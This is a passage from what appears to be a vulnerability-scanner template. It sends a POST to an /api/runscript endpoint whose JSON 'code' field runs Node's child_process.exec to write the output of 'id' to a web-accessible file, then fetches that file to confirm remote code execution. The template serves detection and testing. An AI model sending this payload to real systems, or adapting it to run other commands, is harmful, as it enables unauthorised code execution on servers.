    - gid
    - groups
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/runscript HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"headers": {"normalizedNames": {}, "lazyUpdate": "null"}, "params": {"script":
    {"parameters": [{"name": "ok", "type": "tagid", "value": ""}], "mode": "", "id":
    "", "test": "true", "name": "ok", "outputId": "", "code": "require(''child_process'').exec(''id
    > ./_images/{{filename}}'')"}}}

    '
  - 'GET /_images/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
